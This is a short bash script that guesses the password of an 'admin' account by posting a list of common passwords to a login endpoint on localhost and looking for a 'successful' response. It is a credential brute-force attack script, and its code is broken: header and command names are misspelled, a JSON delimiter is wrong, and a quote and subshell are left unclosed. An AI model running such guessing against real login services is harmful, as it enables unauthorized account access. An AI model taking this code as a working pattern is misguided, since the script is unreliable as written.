#! /bin/bash

URL="https://localhost:8888/api/login"
USER="admin"

PASSWORD=("password" "123456" "admin888" "admin123" "qwerty")

for PW in "${PASSWORD[@]}"
do
	echo -n "testing password : $PW ..."

	RESPONSE=$(curl -s -X POST $URL \
		-H "Conetent-Type: application/json"\
		-d "{\"username\":\"$USER\",|"password\":\"$PW\"}

	if echo "$RESPONSE" | grep -q "successful"; then
		echp -e "\n[+] Found password! -> $PW"
		exit 0
	else
		echo"not yet"
	fi
done
